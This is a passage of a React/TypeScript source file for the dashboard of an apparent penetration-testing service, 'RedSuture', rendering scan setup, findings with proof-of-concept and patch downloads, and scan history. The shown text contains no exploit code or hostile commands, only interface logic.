          <CheckIcon size={14} /> {copyToast}
        </div>
      )}

      {/* Sidebar */}
      <aside className={styles.sidebar}>
        <div className={styles.sidebarHeader}>
          <Link href="/" aria-label="RedSuture home">
            <Logo showText={!sidebarCollapsed} />
          </Link>
          <button
            className={styles.collapseBtn}
            onClick={() => setSidebarCollapsed(!sidebarCollapsed)}
            aria-label={sidebarCollapsed ? 'Expand sidebar' : 'Collapse sidebar'}
            title={sidebarCollapsed ? 'Expand sidebar' : 'Collapse sidebar'}
          >
            <ChevronRightIcon size={16} />
          </button>
        </div>

        <nav className={styles.sidebarNav} aria-label="Dashboard navigation">
          {!sidebarCollapsed && <span className={styles.navGroup}>Workspace</span>}
          {NAV_ITEMS.map(item => (
            <button
              key={item.id}
              className={`${styles.navItem} ${styles.navItemTall} ${activeTab === item.id ? styles.navItemActive : ''}`}
              onClick={() => openTab(item.id)}
              title={sidebarCollapsed ? `${item.label} — ${item.hint}` : undefined}
              aria-current={activeTab === item.id ? 'page' : undefined}
            >
              <item.icon size={18} />
              {!sidebarCollapsed && (
                <span className={styles.navText}>
                  <span>{item.label}</span>
                  <span className={styles.navHint}>{item.hint}</span>
                </span>
              )}
            </button>
          ))}

          {!sidebarCollapsed && <span className={styles.navGroup}>Help</span>}
          <button
            className={styles.navItem}
            onClick={() => { updateGuide({ dismissed: false }); openTab('overview'); }}
            title={sidebarCollapsed ? 'Getting started guide' : undefined}
          >
            <CheckIcon size={18} />
            {!sidebarCollapsed && <span>Getting started</span>}
          </button>
          <Link href="/dashboard/docs" className={styles.navItem} title={sidebarCollapsed ? 'Developer docs' : undefined}>
            <CodeIcon size={18} />
            {!sidebarCollapsed && <span>Developer docs</span>}
          </Link>
        </nav>

        <div className={styles.sidebarFooter}>
          <button className={`btn-primary ${styles.startScanBtn}`} onClick={() => openTab('new-scan')}>
            <PlusIcon size={16} />
            {!sidebarCollapsed && <span>New scan</span>}
          </button>
          <Link href="/dashboard/settings" className={styles.userCard} title="Account settings">
            <span className={styles.userAvatar}>{initials(profile?.name || 'RedSuture')}</span>
            {!sidebarCollapsed && (
              <span className={styles.userInfo}>
                <span className={styles.userName}>{profile?.name || 'Your account'}</span>
                <span className={styles.userOrg}>{profile?.company || 'Set up workspace'}</span>
              </span>
            )}
            {!sidebarCollapsed && <SettingsIcon size={16} className={styles.userGear} />}
          </Link>
        </div>
      </aside>

      {/* Main Content */}
      <main className={styles.main}>
        <header className={styles.topBar}>
          <div className={styles.topBarLeft}>
            <Link href="/" className={styles.mobileLogo} aria-label="RedSuture home">
              <Logo showText={false} />
            </Link>
            <div>
              <h1 className={styles.pageTitle}>{pageMeta.title}</h1>
              <p className={styles.pageSub}>{pageMeta.sub}</p>
            </div>
          </div>
          <div className={styles.topBarRight}>
            <button
              className="btn-secondary"
              aria-label="Export audit bundle"
              title="Export audit bundle"
              onClick={() => downloadFile('redsuture-compliance-audit.json', JSON.stringify({ scans: scansList, findings: findingsList }, null, 2), 'application/json')}
            >
              <DownloadIcon size={14} /> <span className={styles.topBtnText}>Export audit bundle</span>
            </button>
            <button className="btn-primary" onClick={() => openTab('new-scan')}>
              <PlusIcon size={14} /> New scan
            </button>
          </div>
        </header>

        {/* Phones: the sidebar is hidden, so the sections become a tab strip. */}
        <nav className={styles.mobileTabs} aria-label="Dashboard sections">
          {NAV_ITEMS.map(item => (
            <button
              key={item.id}
              className={`${styles.mobileTab} ${activeTab === item.id ? styles.mobileTabActive : ''}`}
              onClick={() => openTab(item.id)}
              aria-current={activeTab === item.id ? 'page' : undefined}
            >
              {item.label}
            </button>
          ))}
          <Link href="/dashboard/docs" className={styles.mobileTab}>Docs</Link>
        </nav>

        <div className={styles.content}>
          {/* OVERVIEW TAB */}
          {activeTab === 'overview' && (
            <div className={styles.stack}>
              {!guide.dismissed && (
                <section className={styles.guide} aria-labelledby="guide-title">
                  <div className={styles.guideHead}>
                    <div>
                      <span className={styles.guideEyebrow}>Getting started · {guideDone} of {guideSteps.length} done</span>
                      <h2 id="guide-title" className={styles.guideTitle}>
                        {guideDone === guideSteps.length ? "You're all set." : 'New here? Four steps to your first fix.'}
                      </h2>
                    </div>
                    <button className="btn-ghost" onClick={() => updateGuide({ dismissed: true })}>Hide guide</button>
                  </div>
                  <div className={styles.guideBar} aria-hidden="true">
                    <span style={{ width: `${(guideDone / guideSteps.length) * 100}%` }} />
                  </div>
                  <ol className={styles.guideSteps}>
                    {guideSteps.map((st, i) => (
                      <li key={st.key} className={`${styles.guideStep} ${st.done ? styles.guideStepDone : ''}`}>
                        <span className={styles.guideCheck} aria-hidden="true">{st.done ? <CheckIcon size={14} /> : i + 1}</span>
                        <div className={styles.guideStepBody}>
                          <span className={styles.guideStepTitle}>
                            {st.title}
                            {st.done && <span className={styles.srOnly}> (done)</span>}
                          </span>
                          <span className={styles.guideStepDesc}>{st.desc}</span>
                        </div>
                        {!st.done && <div className={styles.guideAction}>{st.action}</div>}
                      </li>
                    ))}
                  </ol>
                </section>
              )}

              {hasSampleScans && (
                <p className={styles.sampleNote}>
                  <span className={styles.samplePill}>Sample</span>
                  <span>Scans marked <strong>Sample</strong> are example data so you can explore. Your own results appear here after your first scan.</span>
                </p>
              )}

              <div className={styles.statsGrid}>
                {stats.map(st => (
                  <div key={st.label} className={styles.statCard}>
                    <div className={styles.statTop}>
                      <span className={styles.statLabel}>{st.label}</span>
                      <span className={`${styles.statIcon} ${styles[`tone_${st.tone}`]}`}><st.icon size={16} /></span>
                    </div>
                    <div className={styles.statValue}>{st.value}</div>
                    <div className={styles.statHint}>{st.hint}</div>
                  </div>
                ))}
              </div>

              <section className={styles.panel}>
                <div className={styles.panelHeader}>
                  <h2 className={styles.panelTitle}>Recent scans</h2>
                  <button className="btn-ghost" onClick={() => openTab('history')}>
                    View all <ArrowRightIcon size={14} />
                  </button>
                </div>
                <ul className={styles.scanList}>
                  {scansList.map(scan => (
                    <li key={scan.id}>
                      <button className={styles.scanRow} onClick={() => goToFindings(scan)}>
                        <span className={styles.scanTarget}>
                          <span className={styles.scanTargetUrl}>{scan.target}</span>
                          <span className={styles.scanDate}>
                            {SAMPLE_SCAN_IDS.has(scan.id) && <span className={`${styles.samplePill} ${styles.samplePillLead}`}>Sample</span>}
                            {scan.targetType} · {scan.date} · {scan.duration}
                          </span>
                        </span>
                        <span className={styles.scanBadges}>
                          {scan.critical > 0 && <SeverityPill level="critical" count={scan.critical} />}
                          {scan.high > 0 && <SeverityPill level="high" count={scan.high} />}
                          {scan.medium > 0 && <SeverityPill level="medium" count={scan.medium} />}
                        </span>
                        <span className={`${styles.scanScore} ${scoreClass(scan.score)}`}>{scan.score}<small>/100</small></span>
                        <ChevronRightIcon className={styles.rowChevron} />
                      </button>
                    </li>
                  ))}
                </ul>
              </section>
            </div>
          )}

          {/* NEW SCAN TAB */}
          {activeTab === 'new-scan' && (
            <div className={styles.newScan}>
              <section className={styles.formSection}>
                <div className={styles.formSectionHead}>
                  <span className={styles.stepBadge}>1</span>
                  <div>
                    <h2 className={styles.formSectionTitle}>What do you want to test?</h2>
                    <p className={styles.formSectionDesc}>Pick the kind of thing to scan. Not sure? Start with <strong>Web application</strong>.</p>
                  </div>
                </div>
                <div className={styles.targetGrid} role="radiogroup" aria-label="Target type">
                  {TARGET_TYPES.map(t => (
                    <button
                      key={t.id}
                      type="button"
                      role="radio"
                      aria-checked={scanType === t.id}
                      className={`${styles.targetCard} ${scanType === t.id ? styles.targetCardActive : ''}`}
                      onClick={() => setScanType(t.id)}
                    >
                      <span className={styles.targetCardTop}>
                        <span className={styles.targetCardIcon}><t.icon size={18} /></span>
                        <span className={styles.targetCardBadge}>{t.badge}</span>
                      </span>
                      <span className={styles.targetCardLabel}>{t.label}</span>
                      <span className={styles.targetCardDesc}>{t.desc}</span>
                    </button>
                  ))}
                </div>
              </section>

              <section className={styles.formSection}>
                <div className={styles.formSectionHead}>
                  <span className={styles.stepBadge}>2</span>
                  <div>
                    <h2 className={styles.formSectionTitle}>When should it run?</h2>
                    <p className={styles.formSectionDesc}>
                      Run it once now, or repeat it on a schedule. Not sure? Choose <strong>Run once</strong>. Options depend on your {profile?.plan || 'Pro'} plan.
                    </p>
                  </div>
                </div>
                <div className={styles.scheduleGrid}>
                  {SCHEDULES.map(s => {
                    const locked = planTier(profile?.plan) < s.minTier;
                    const active = schedule === s.id;
                    return (
                      <button
                        key={s.id}
                        type="button"
                        disabled={locked}
                        aria-pressed={active}
                        className={`${styles.scheduleOption} ${active ? styles.scheduleOptionActive : ''} ${locked ? styles.scheduleOptionLocked : ''}`}
                        onClick={() => !locked && setSchedule(s.id)}
                      >
                        <span className={styles.scheduleTop}>
                          <span className={styles.scheduleLabel}>
                            {s.id === 'manual' ? <RadarIcon size={15} /> : <CalendarIcon size={15} />} {s.label}
                          </span>
                          {locked && <span className={styles.scheduleLock}><LockIcon size={12} /> {s.tier}</span>}
                        </span>
                        <span className={styles.scheduleDesc}>{s.desc}</span>
                      </button>
                    );
                  })}
                </div>

                {(schedule === 'weekly' || schedule === 'monthly') && (() => {
                  const maxDays = maxScheduleDays(profile?.plan);
                  const capLabel = maxDays === Infinity ? 'any days' : `up to ${maxDays} day${maxDays === 1 ? '' : 's'}`;
                  const toggleWeekday = (d: number) => setScheduleWeekdays(prev =>
                    prev.includes(d) ? prev.filter(x => x !== d) : prev.length >= maxDays ? prev : [...prev, d].sort((a, b) => a - b));
                  const toggleDay = (d: number) => setScheduleDays(prev =>
                    prev.includes(d) ? prev.filter(x => x !== d) : prev.length >= maxDays ? prev : [...prev, d].sort((a, b) => a - b));
                  return (
                    <div className={styles.schedulePicker}>
                      <div className={styles.pickerHead}>
                        <span className={styles.pickerTitle}>
                          {schedule === 'weekly' ? 'Which days each week?' : 'Which days each month?'}
                        </span>
                        <span className={styles.pickerCap}>
                          {profile?.plan || 'Pro'} plan · {capLabel}
                          {maxDays !== Infinity && (
                            <Link href="/dashboard/settings" className={styles.pickerUpgrade}>Upgrade for more</Link>
                          )}
                        </span>
                      </div>

                      {schedule === 'weekly' ? (
                        <div className={styles.weekdayRow}>
                          {WEEKDAYS.map((w, i) => {
                            const active = scheduleWeekdays.includes(i);
                            const blocked = !active && scheduleWeekdays.length >= maxDays;
                            return (
                              <button key={w} type="button" disabled={blocked} aria-pressed={active}
                                className={`${styles.weekdayPill} ${active ? styles.weekdayPillActive : ''}`}
                                onClick={() => toggleWeekday(i)}>{w}</button>
                            );
                          })}
                        </div>
                      ) : (
                        <ScheduleCalendar month={calMonth} onMonth={setCalMonth}
                          selected={scheduleDays} onToggle={toggleDay} max={maxDays} />
                      )}

                      <p className={styles.pickerSummary}>
                        {schedule === 'weekly'
                          ? scheduleWeekdays.length
                            ? `Runs every ${[...scheduleWeekdays].sort((a, b) => a - b).map(d => WEEKDAYS[d]).join(', ')}.`
                            : 'Pick at least one weekday.'
                          : scheduleDays.length
                            ? `Runs on the ${[...scheduleDays].sort((a, b) => a - b).map(ORDINAL).join(', ')} of each month.`
                            : 'Pick at least one day.'}
                      </p>
                    </div>
                  );
                })()}

                {schedule !== 'manual' && (
                  <p className={styles.scheduleNote}>
                    The first scan starts now; {SCHEDULES.find(s => s.id === schedule)?.label.toLowerCase()} runs after that are handled by the scheduler. Each run uses one scan from your plan — pause anytime from scan history.
                  </p>
                )}
              </section>


              <section className={styles.formSection}>
                <div className={styles.formSectionHead}>
                  <span className={styles.stepBadge}>3</span>
                  <div>
                    <h2 className={styles.formSectionTitle}>Where is it?</h2>
                    <p className={styles.formSectionDesc}>Enter the address of what you&apos;re testing. Only test things you own or have written permission to test.</p>
                  </div>
                </div>

                {scanType === 'live-url' && (
                  <div className={styles.field}>
                    <label htmlFor="target-url" className={styles.inputLabel}>
                      Website or API address <span className={styles.inputHint}>Starts with https://</span>
                    </label>
                    <input id="target-url" type="url" className={styles.input} placeholder="https://your-app.com" value={targetUrl} onChange={e => setTargetUrl(e.target.value)} />
                  </div>
                )}

                {scanType === 'github-repo' && (
                  <div className={styles.field}>
                    <label htmlFor="target-repo" className={styles.inputLabel}>
                      Repository address <span className={styles.inputHint}>Link to the repo on GitHub, GitLab or Bitbucket</span>
                    </label>
                    <input id="target-repo" type="url" className={styles.input} placeholder="https://github.com/your-org/your-repo" value={targetRepo} onChange={e => setTargetRepo(e.target.value)} />
                  </div>
                )}

                {scanType === 'local-dir' && (
                  <div className={styles.field}>
                    <label htmlFor="target-dir" className={styles.inputLabel}>
                      Folder path <span className={styles.inputHint}>On the machine running RedSuture</span>
                    </label>
                    <input id="target-dir" type="text" className={styles.input} placeholder="./my-app" value={targetDir} onChange={e => setTargetDir(e.target.value)} />
                  </div>
                )}

                {scanType === 'whitebox' && (
                  <div className={styles.twoCol}>
                    <div className={styles.field}>
                      <label htmlFor="wb-repo" className={styles.inputLabel}>Repository address</label>
                      <input id="wb-repo" type="url" className={styles.input} placeholder="https://github.com/your-org/your-repo" value={whiteboxRepo} onChange={e => setWhiteboxRepo(e.target.value)} />
                    </div>
                    <div className={styles.field}>
                      <label htmlFor="wb-url" className={styles.inputLabel}>Live app address</label>
                      <input id="wb-url" type="url" className={styles.input} placeholder="https://staging.your-app.com" value={whiteboxUrl} onChange={e => setWhiteboxUrl(e.target.value)} />
                    </div>
                  </div>
                )}

                {scanType === 'target-list' && (
                  <div className={styles.field}>
                    <label htmlFor="target-list-txt" className={styles.inputLabel}>
                      List of targets <span className={styles.inputHint}>One address or repository per line</span>
                    </label>
                    <textarea
                      id="target-list-txt"
                      className={styles.textarea}
                      rows={5}
                      placeholder={`https://app.your-company.com\nhttps://api.your-company.com\nhttps://github.com/your-org/your-repo`}
                      value={targetListContent}
                      onChange={e => setTargetListContent(e.target.value)}
                    />
                  </div>
                )}
              </section>

              <section className={styles.formSection}>
                <div className={styles.formSectionHead}>
                  <span className={styles.stepBadge}>4</span>
                  <div>
                    <h2 className={styles.formSectionTitle}>How thorough should it be?</h2>
                    <p className={styles.formSectionDesc}>Your <strong>RedSuture Agents</strong> run every scan. Choose how deep to go — deeper scans are available on higher plans.</p>
                  </div>
                </div>

                <div className={styles.engineCard}>
                  <span className={styles.engineCardIcon}><RadarIcon size={18} /></span>
                  <div className={styles.engineCardBody}>
                    <span className={styles.engineCardName}>
                      RedSuture Agents <span className={styles.engineCardTag}>Your pentest engine</span>
                    </span>
                    <span className={styles.engineCardDesc}>Autonomous agents run the full penetration test — included on every plan.</span>
                  </div>
                  <CheckIcon size={18} className={styles.engineCardCheck} />
                </div>

                <div className={styles.depthBlock}>
                  <span className={styles.inputLabel}>Depth <span className={styles.inputHint}>How long and how deep the scan goes</span></span>
                  <div className={styles.scheduleGrid} role="radiogroup" aria-label="Scan depth">
                    {DEPTH_OPTIONS.map(d => {
                      const locked = planTier(profile?.plan) < d.minTier;
                      const active = scanMode === d.value;
                      return (
                        <button
                          key={d.value}
                          type="button"
                          role="radio"
                          aria-checked={active}
                          disabled={locked}
                          className={`${styles.scheduleOption} ${active ? styles.scheduleOptionActive : ''} ${locked ? styles.scheduleOptionLocked : ''}`}
                          onClick={() => !locked && setScanMode(d.value)}
                        >
                          <span className={styles.scheduleTop}>
                            <span className={styles.scheduleLabel}>{d.label}{d.recommended && !locked ? ' · Recommended' : ''}</span>
                            {locked
                              ? <span className={styles.scheduleLock}><LockIcon size={12} /> {d.tier}</span>
                              : <span className={styles.depthTime}>{d.time}</span>}
                          </span>
                          <span className={styles.scheduleDesc}>{d.desc}</span>
                        </button>
                      );
                    })}
                  </div>
                  {(() => {
                    const locked = DEPTH_OPTIONS.filter(d => planTier(profile?.plan) < d.minTier);
                    if (locked.length === 0) return null;
                    const names = locked.map(d => d.label);
                    const list = names.length > 1 ? `${names.slice(0, -1).join(', ')} and ${names[names.length - 1]}` : names[0];
                    return (
                      <p className={styles.scheduleNote}>
                        {list} {locked.length > 1 ? 'scans unlock' : 'scan unlocks'} on higher plans. <Link href="/dashboard/settings" className={styles.pickerUpgrade}>Upgrade your plan</Link>
                      </p>
                    );
                  })()}
                </div>

                {notesOpen ? (
                  <div className={styles.field}>
                    <label htmlFor="instructions" className={styles.inputLabel}>
                      Notes for the agents <span className={styles.inputHint}>Optional — areas to focus on or avoid</span>
                    </label>
                    <textarea
                      id="instructions"
                      className={styles.textarea}
                      rows={3}
                      autoFocus
                      placeholder="e.g. Focus on tenant isolation in /v2/orders, do not delete user accounts"
                      value={instructions}
                      onChange={e => setInstructions(e.target.value)}
                    />
                  </div>
                ) : (
                  <button type="button" className={styles.notesToggle} onClick={() => setNotesOpen(true)}>
                    <PlusIcon size={14} /> Add notes for the agents <span>(optional)</span>
                  </button>
                )}
              </section>

              {liveScanCard}

              <section className={styles.launchPanel} aria-label="Launch">
                <label className={styles.authCheck}>
                  <input type="checkbox" checked={authorized} onChange={e => setAuthorized(e.target.checked)} />
                  <span>I own this target or have written permission to test it.</span>
                </label>
                <div className={styles.launchRow}>
                  <p className={styles.launchSummary} aria-live="polite">
                    {activeTargets.length > 0 ? (
                      <>
                        Ready to test <strong>{activeTargets[0]}</strong>
                        {activeTargets.length > 1 && ` and ${activeTargets.length - 1} more`}
                        {' · '}{DEPTH_OPTIONS.find(d => d.value === scanMode)?.label} depth
                        {' · '}{SCHEDULES.find(sc => sc.id === schedule)?.label}
                      </>
                    ) : (
                      blocker
                    )}
                  </p>
                  <button
                    type="button"
                    className={`btn-primary ${styles.launchBtn}`}
                    disabled={scanProgress.status === 'running' || Boolean(blocker)}
                    onClick={startScan}
                  >
                    {schedule === 'manual' ? <RadarIcon size={16} /> : <CalendarIcon size={16} />}
                    {scanProgress.status === 'running'
                      ? 'Scan in progress…'
                      : schedule === 'manual'
                        ? 'Launch scan'
                        : 'Schedule & run first scan'}
                  </button>
                </div>
                {blocker && activeTargets.length > 0 && <p className={styles.launchHint}>{blocker}</p>}
              </section>
            </div>
          )}

          {/* FINDINGS TAB */}
          {activeTab === 'findings' && (
            <div className={styles.stack}>
              <details className={styles.helpBox}>
                <summary>New here? How to read this page</summary>
                <div className={styles.helpGrid}>
                  <div>
                    <h3 className={styles.helpTitle}>How urgent is it?</h3>
                    <ul className={styles.helpList}>
                      {SEVERITY_GUIDE.map(g => (
                        <li key={g.level}><SeverityPill level={g.level} /> <span>{g.text}</span></li>
                      ))}
                    </ul>
                  </div>
                  <div>
                    <h3 className={styles.helpTitle}>What the terms mean</h3>
                    <dl className={styles.helpTerms}>
                      <div><dt>Proof of concept</dt><dd>The exact steps we used to show the issue is real. Every finding has one.</dd></div>
                      <div><dt>CVSS</dt><dd>The industry-standard severity score, from 0 to 10.</dd></div>
                      <div><dt>Security score</dt><dd>0–100 for the whole target. Higher is better.</dd></div>
                      <div><dt>Patch</dt><dd>A ready-made code change that fixes the issue. Download it below.</dd></div>
                    </dl>
                  </div>
                </div>
                <p className={styles.helpFoot}>Start at the top of the list — the most urgent issues come first. Pick one to see the proof and the fix.</p>
              </details>

              {showingSampleFindings && (
                <p className={styles.sampleNote}>
                  <span className={styles.samplePill}>Sample</span>
                  <span>These are example findings so you can see what a report looks like. Run a scan to see your own.</span>
                </p>
              )}

              <section className={styles.findingsHeader}>
                <div className={styles.findingsMeta}>
                  <div className={styles.summaryLabel}>Active target</div>
                  <div className={styles.findingsTarget}>{selectedScan.target}</div>
                  <div className={styles.findingsDate}>{selectedScan.targetType} · Scanned {selectedScan.date}</div>
                </div>
                <div className={styles.findingsBadges}>
                  <SeverityPill level="critical" count={findingsList.filter(f => f.severity === 'critical').length} />
                  <SeverityPill level="high" count={findingsList.filter(f => f.severity === 'high').length} />
                  <SeverityPill level="medium" count={findingsList.filter(f => f.severity === 'medium').length} />
                </div>
                <div className={styles.securityScore}>
                  <span>Security posture score</span>
                  <span className={`${styles.scoreValue} ${scoreClass(selectedScan.score)}`}>{selectedScan.score}<small>/100</small></span>
                </div>
              </section>

              <div className={styles.findingsLayout}>
                <ul className={styles.vulnList}>
                  {findingsList.map(v => (
                    <li key={v.id}>
                      <button
                        className={`${styles.vulnCard} ${selectedVuln?.id === v.id ? styles.vulnCardSelected : ''}`}
                        onClick={() => setSelectedVuln(v)}
                        aria-current={selectedVuln?.id === v.id ? 'true' : undefined}
                      >
                        <span className={styles.vulnCardTop}>
                          <SeverityPill level={v.severity as Severity} />
                          <span className={styles.cvssScore}>CVSS {v.cvss}</span>
                        </span>
                        <span className={styles.vulnTitle}>{v.title}</span>
                        <code className={styles.vulnEndpoint}>{v.endpoint}</code>
                      </button>
                    </li>
                  ))}
                </ul>

                <article className={styles.vulnDetail}>
                  <header className={styles.vulnDetailHeader}>
                    <div className={styles.vulnDetailTags}>
                      <SeverityPill level={selectedVuln.severity as Severity} />
                      <span className={styles.detailTag}>CVSS {selectedVuln.cvss}</span>
                      <span className={styles.detailTagOk}><CheckIcon size={12} /> PoC sandbox verified</span>
                    </div>
                    <h2 className={styles.vulnDetailTitle}>{selectedVuln.title}</h2>
                    <dl className={styles.vulnDetailMeta}>
                      <div><dt>Category</dt><dd>{selectedVuln.type}</dd></div>
                      <div><dt>Endpoint</dt><dd><code className={styles.inlineCode}>{selectedVuln.endpoint}</code></dd></div>
                    </dl>
                  </header>

                  <div className={styles.downloadBar}>
                    <div className={styles.downloadBarTitle}>
                      <strong>Download the fix</strong>
                      <span>Give the patch to a developer, or follow the guide to fix it step by step.</span>
                    </div>
                    <div className={styles.downloadButtons}>
                      <button className={styles.downloadBtn} onClick={() => downloadFix(`${selectedVuln.id}-code-fix.patch`, selectedVuln.patch, 'text/plain')}>
                        <DownloadIcon size={14} /> Patch <code>.patch</code>
                      </button>
                      <button
                        className={styles.downloadBtn}
                        onClick={() => downloadFix(
                          `${selectedVuln.id}-remediation-guide.md`,
                          `# Remediation Guide: ${selectedVuln.title}\n\n## Vulnerability Details\n- Severity: ${selectedVuln.severity.toUpperCase()} (CVSS ${selectedVuln.cvss})\n- Type: ${selectedVuln.type}\n- Endpoint: ${selectedVuln.endpoint}\n\n## Description\n${selectedVuln.description}\n\n## Verified Proof of Concept\n\`\`\`\n${selectedVuln.poc}\n\`\`\`\n\n## Step-by-Step Fix Procedure\n${selectedVuln.fix || selectedVuln.remediation}\n\n## Surgical Code Patch\n\`\`\`diff\n${selectedVuln.patch}\n\`\`\`\n`,
                          'text/markdown'
                        )}
                      >
                        <DownloadIcon size={14} /> Guide <code>.md</code>
                      </button>
                      <button
                        className={styles.downloadBtn}
                        onClick={() => downloadFix(
                          `redsuture-${selectedVuln.id}.sarif`,
                          JSON.stringify({
                            version: '2.1.0',
                            $schema: 'https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json',
                            runs: [{
                              tool: { driver: { name: 'RedSuture Autonomous AI Security', version: '2.4.0' } },
                              results: [{
                                ruleId: selectedVuln.id,
                                message: { text: selectedVuln.title },
                                properties: { cvss: selectedVuln.cvss, severity: selectedVuln.severity, remediation: selectedVuln.fix || selectedVuln.remediation }
                              }]
                            }]
                          }, null, 2),
                          'application/json'
                        )}
                      >
                        <DownloadIcon size={14} /> SARIF <code>.sarif</code>
                      </button>
                      <button
                        className={styles.downloadBtn}
                        onClick={() => downloadFix(`audit-report-${selectedVuln.id}.json`, JSON.stringify(selectedVuln, null, 2), 'application/json')}
                      >
                        <DownloadIcon size={14} /> Report <code>.json</code>
                      </button>
                    </div>
                  </div>

                  <section className={styles.vulnSection}>
                    <h3 className={styles.vulnSectionTitle}>Proof it&apos;s real (verified in a sandbox)</h3>
                    <pre className={styles.codeBlock}><code>{selectedVuln.poc}</code></pre>
                  </section>

                  <section className={styles.vulnSection}>
                    <h3 className={styles.vulnSectionTitle}>What&apos;s wrong and why it matters</h3>
                    <p className={styles.vulnDesc}>{selectedVuln.description}</p>
                  </section>

                  <section className={styles.vulnSection}>
                    <h3 className={styles.vulnSectionTitle}>How to fix it, step by step</h3>
                    <ol className={styles.fixSteps}>
                      {(selectedVuln.fix || selectedVuln.remediation || '').split('\n').map((step, idx) => (
                        <li key={idx}>{step.replace(/^\d+\.\s*/, '')}</li>
                      ))}
                    </ol>
                  </section>

                  <section className={styles.vulnSection}>
                    <h3 className={styles.vulnSectionTitle}>The code change (patch)</h3>
                    <pre className={`${styles.codeBlock} ${styles.diff}`}>
                      {selectedVuln.patch.split('\n').map((line, idx) => (
                        <span key={idx} className={diffLineClass(line)}>{line || ' '}{'\n'}</span>
                      ))}
                    </pre>
                  </section>

                  <footer className={styles.vulnActions}>
                    <button
                      className="btn-primary"
                      onClick={() => {
                        navigator.clipboard?.writeText(selectedVuln.patch);
                        updateGuide({ downloaded: true });
                        showToast('Code patch copied to clipboard');
                      }}
                    >
                      <CopyIcon size={14} /> Copy patch
                    </button>
                    <button
                      className="btn-secondary"
                      onClick={() => {
                        navigator.clipboard?.writeText(`${selectedVuln.title}\n\nDescription:\n${selectedVuln.description}\n\nRemediation Steps:\n${selectedVuln.fix || selectedVuln.remediation}`);
                        showToast('Remediation guide copied');
                      }}
                    >
                      Copy guide
                    </button>
                  </footer>
                </article>
              </div>
            </div>
          )}

          {/* HISTORY TAB */}
          {activeTab === 'history' && (
            <section className={styles.panel}>
              <div className={styles.panelHeader}>
                <h2 className={styles.panelTitle}>All scans</h2>
                <button className="btn-secondary" onClick={() => downloadFile('all-scans-summary.json', JSON.stringify(scansList, null, 2), 'application/json')}>
                  <DownloadIcon size={14} /> Download all history
                </button>
              </div>
              <div className={styles.tableWrap}>
                <table className={styles.table}>
                  <thead>
                    <tr>
                      <th>Target</th>
                      <th>Date</th>
                      <th>Duration</th>
                      <th>Issues found</th>
                      <th>Score <span className={styles.thHint}>(higher is better)</span></th>
                      <th><span className={styles.srOnly}>Actions</span></th>
                    </tr>
                  </thead>
                  <tbody>
                    {scansList.map(scan => (
                      <tr key={scan.id} onClick={() => goToFindings(scan)}>
                        <td>
                          <span className={styles.tableTarget}>
                            {scan.target}
                            {SAMPLE_SCAN_IDS.has(scan.id) && <span className={styles.samplePill}>Sample</span>}
                          </span>
                          <span className={styles.tableSub}>{scan.targetType}</span>
                        </td>
                        <td className={styles.tableMuted}>{scan.date}</td>
                        <td className={styles.tableMuted}>{scan.duration}</td>
                        <td>
                          <span className={styles.scanBadges}>
                            <SeverityPill level="critical" count={scan.critical} />
                            <SeverityPill level="high" count={scan.high} />
                          </span>
                        </td>
                        <td><span className={`${styles.tableScore} ${scoreClass(scan.score)}`}>{scan.score}</span></td>
                        <td className={styles.tableAction}>
                          <button className="btn-ghost" onClick={e => { e.stopPropagation(); goToFindings(scan); }}>
                            View findings <ChevronRightIcon size={14} />
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </section>
          )}
        </div>
      </main>
    </div>
  );
}
